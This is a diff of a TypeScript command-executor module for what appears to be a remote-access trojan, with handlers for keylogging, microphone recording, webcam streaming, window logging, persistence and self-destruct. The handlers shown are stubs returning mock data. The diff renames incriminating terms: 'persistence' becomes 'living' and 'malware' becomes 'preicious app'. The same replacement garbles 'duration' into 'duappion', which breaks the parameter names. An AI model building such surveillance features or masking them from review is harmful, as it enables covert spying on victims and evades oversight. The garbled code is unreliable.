@@ -94,13 +94,13 @@ export const commandExecutors = {
 
   stream: async (params: any): Promise<ExecutionResult> => {
     try {
-      const duration = params.duration || 10
-      console.log(`[Executor] Starting stream for ${duration} seconds`)
+      const duappion = params.duappion || 10
+      console.log(`[Executor] Starting stream for ${duappion} seconds`)
       return {
         success: true,
         data: {
           stream_id: Math.random().toString(36).substr(2, 9),
-          duration,
+          duappion,
           status: 'streaming',
         },
       }
@@ -111,13 +111,13 @@ export const commandExecutors = {
 
   microphone: async (params: any): Promise<ExecutionResult> => {
     try {
-      const duration = params.duration || 10
-      console.log(`[Executor] Recording audio for ${duration} seconds`)
+      const duappion = params.duappion || 10
+      console.log(`[Executor] Recording audio for ${duappion} seconds`)
       return {
         success: true,
         data: {
           audio_path: '/tmp/audio.wav',
-          duration,
+          duappion,
           timestamp: new Date().toISOString(),
         },
       }
@@ -128,13 +128,13 @@ export const commandExecutors = {
 
   keylog: async (params: any): Promise<ExecutionResult> => {
     try {
-      const duration = params.duration || 60
-      console.log(`[Executor] Starting keylogger for ${duration} seconds`)
+      const duappion = params.duappion || 60
+      console.log(`[Executor] Starting keylogger for ${duappion} seconds`)
       return {
         success: true,
         data: {
           keylog_file: '/tmp/keylog.txt',
-          duration,
+          duappion,
           keys_logged: Math.floor(Math.random() * 1000),
         },
       }
@@ -160,13 +160,13 @@ export const commandExecutors = {
 
   window_logger: async (params: any): Promise<ExecutionResult> => {
     try {
-      const duration = params.duration || 300
-      console.log(`[Executor] Starting window logger for ${duration} seconds`)
+      const duappion = params.duappion || 300
+      console.log(`[Executor] Starting window logger for ${duappion} seconds`)
       return {
         success: true,
         data: {
           log_file: '/tmp/window_log.txt',
-          duration,
+          duappion,
           windows_tracked: 15,
         },
       }
@@ -177,13 +177,13 @@ export const commandExecutors = {
 
   webcam_stream: async (params: any): Promise<ExecutionResult> => {
     try {
-      const duration = params.duration || 30
-      console.log(`[Executor] Starting webcam stream for ${duration} seconds`)
+      const duappion = params.duappion || 30
+      console.log(`[Executor] Starting webcam stream for ${duappion} seconds`)
       return {
         success: true,
         data: {
           stream_id: Math.random().toString(36).substr(2, 9),
-          duration,
+          duappion,
           status: 'streaming',
         },
       }
@@ -483,10 +483,10 @@ export const commandExecutors = {
     }
   },
 
-  // Persistence commands
-  enable_persistence: async (params: any): Promise<ExecutionResult> => {
+  // living commands
+  enable_living: async (params: any): Promise<ExecutionResult> => {
     try {
-      console.log('[Executor] Enabling persistence')
+      console.log('[Executor] Enabling living')
       return {
         success: true,
         data: {
@@ -567,7 +567,7 @@ export const commandExecutors = {
 
   self_destruct: async (params: any): Promise<ExecutionResult> => {
     try {
-      console.log('[Executor] Self-destructing malware')
+      console.log('[Executor] Self-destructing preicious app ')
       return {
         success: true,
         data: {
